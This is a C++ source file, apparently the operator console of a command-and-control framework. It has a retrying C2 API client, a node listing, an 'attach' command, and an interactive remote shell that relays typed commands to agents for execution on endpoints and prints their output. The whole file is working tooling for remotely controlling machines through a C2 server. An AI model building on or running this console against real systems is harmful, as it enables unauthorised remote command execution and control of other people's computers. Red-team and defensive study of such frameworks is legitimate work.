#include <chrono>
#include <thread>

#include <boost/algorithm/string.hpp>

#include "Common.h"
#include "Commands.h"
#include "nlohmann/json.hpp"

nlohmann::json C2ServerApi(const std::string& path, httplib::Client &client, const httplib::Headers &headers, const nlohmann::json &data) {
    std::string content_type = "application/json";
    std::string content;
    nlohmann::json response;

    httplib::Result res;

    int count = 5;
    while (count > 0) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        if (!((res = client.Post(path, headers, data.dump(), content_type)))) {
            auto error = res.error();
            std::cerr << httplib::to_string(error) << std::endl;
            --count;
            continue;
        }

        if (res->status == httplib::StatusCode::OK_200) {
            content = res->body;
            break;
        }
        else {
            --count;
        }
    }

    if (count == 0)
        return response;

    try {
        response = nlohmann::json::parse(content);
    }
    catch (const nlohmann::json::parse_error &error) {
        std::cerr << error.what() << std::endl;
    }
    catch (const nlohmann::json::type_error &error) {
        std::cerr << error.what() << std::endl;
    }
    catch (std::exception const &error)
    {
        std::cerr << error.what() << std::endl;
    }
    catch (...) {
        std::cerr << "Unknown JSON error while parsing the response from C2" << std::endl;
    }

    return response;
}

std::string shell(httplib::Client &client, const httplib::Headers &headers, const std::vector<std::string>& arguments) {
    /*
     * The first element should always be: shell
     * From element #2 onwards, everything should be clubbed together
     * as payload will pass whole thing to sub-shell process
     */

    if (arguments.size() == 1) {
        if (arguments[0] == std::string("shell")) {
            // this is interactive remote shell mode
            context.setActiveModule("shell");
            bool isShellActive = true;
            std::string input;
            while (isShellActive) {
                std::getline(ConsoleRead(), input);

                // we should be able to exit the shell
                if (input == std::string("exit") || input == std::string("quit")) {
                    isShellActive = false;
                    context.setActiveModule("");
                    break;
                }
                // all other commands should be passed to C2, for local execution on endpoint
                nlohmann::json data;
                data["host_identifier"] = context.attachedNode();
                data["command"] = "shell";

                nlohmann::json cmd_args = nlohmann::json::array();
                cmd_args.push_back(input);
                data["arguments"] = cmd_args;

                unsigned long long command_id = 0;

                auto response = C2ServerApi("/set_command", client, headers, data);
                if (response.contains("id") && response["id"].is_number_unsigned()) {
                    command_id = response["id"].get<unsigned long long>();
                }

                std::this_thread::sleep_for(std::chrono::seconds(2));

                data = nlohmann::json::object();
                data["host_identifier"] = context.attachedNode();
                data["command_id"] = command_id;

                response = C2ServerApi("/get_response", client, headers, data);
                if (response.contains("response")) {
                    if (response["response"].is_string()) {
                        std::cout << response["response"].get<std::string>() << std::endl;
                    }
                    else {
                        auto response_data = response["response"];
                        std::cout << response_data.dump() << std::endl;
                    }
                }
            }
        }
    }

    return std::string("");
}

std::string list_nodes(httplib::Client &client, const httplib::Headers &headers, const std::vector<std::string>& arguments) {
    switch (arguments.size()) {
        case 0:
            // someone called the function incorrectly. First argument should always be our command: lsnode
            break;
        case 1:
            // someone called the function incorrectly. First argument should always be our command: lsnode
            if (arguments[0] != std::string("lsnode")) {
                return std::string("");
            }

        {
            nlohmann::json data;

            // TODO: implement pagination here
            unsigned long long id = 0;
            unsigned long long limit = 10;
            unsigned long long last_seen = 0;
            data["last_seen"] = last_seen;
            data["id"] = id;
            data["limit"] = limit;
            auto response = C2ServerApi("/list_nodes", client, headers, data);
            if (response.contains("nodes") && response["nodes"].is_array()) {
                auto nodes = response["nodes"];

                for (auto& node : nodes) {
                    if (node.contains("host_identifier") &&
                        node.contains("hostname") &&
                        node.contains("os_name") &&
                        node.contains("agent_version")) {
                        std::cout << node["host_identifier"].get<std::string>() << "\t"
                        << node["hostname"].get<std::string>() << "\t"
                        << node["os_name"].get<std::string>() << "\t"
                        << node["agent_version"].get<std::string>()
                        << std::endl;
                        }
                }
            }
        }
            break;
        default:
            return std::string("");
    }

    return std::string("");
}

std::string attach(httplib::Client &client, const httplib::Headers &headers, const std::vector<std::string>& arguments) {
    std::stringstream ss;

    if (arguments.size() == 1) {
        ss << "Usage: attach <node identifier>" << std::endl;
    }
    else if (arguments.size() == 2) {
        context.attach(arguments[1]);
        context.setActiveModule("agent");

        std::string input;
        while (context.isAttached()) {
            std::getline(ConsoleRead(), input);

            boost::trim_right(input);
            if (input.empty())
                continue;

            // we should be able to exit the shell
            if (input == std::string("exit") || input == std::string("quit") || input == std::string("detach")) {
                context.detach();
                break;
            }
            if (input == std::string("shell")) {
                std::vector<std::string> shell_arguments;
                shell_arguments.push_back(input);
                shell(client, headers, shell_arguments);
                context.setActiveModule("agent");
                continue;
            }

            // we only handle exit, quit and shell.
            // all others are passed to agent as is
            // all other commands should be passed to C2, for local execution on endpoint

            nlohmann::json data;
            nlohmann::json cmd_args = nlohmann::json::array();
            data["host_identifier"] = context.attachedNode();

            // is it `shell` command with arguments?
            if (input.starts_with("shell ")) {
                input.erase(input.begin(), input.begin() + std::string("shell ").length());
                data["command"] = "shell";
                cmd_args.push_back(input);
            }
            else {
                std::vector<std::string> cmd_tokens;
                boost::split(cmd_tokens, input, boost::is_any_of(" "));

                data["command"] = cmd_tokens[0];
                for (auto& token : cmd_tokens) {
                    cmd_args.push_back(token);
                }
            }

            data["arguments"] = cmd_args;
            unsigned long long command_id = 0;

            auto response = C2ServerApi("/set_command", client, headers, data);
            if (response.contains("id") && response["id"].is_number_unsigned()) {
                command_id = response["id"].get<unsigned long long>();
            }

            std::this_thread::sleep_for(std::chrono::seconds(2));

            data = nlohmann::json::object();
            data["host_identifier"] = context.attachedNode();
            data["command_id"] = command_id;

            response = C2ServerApi("/get_response", client, headers, data);
            if (response.contains("response")) {
                if (response["response"].is_string()) {
                    std::cout << response["response"].get<std::string>() << std::endl;
                }
                else {
                    auto response_data = response["response"];
                    std::cout << response_data.dump() << std::endl;
                }
            }
        }
        context.detach();
    }
    return ss.str();
}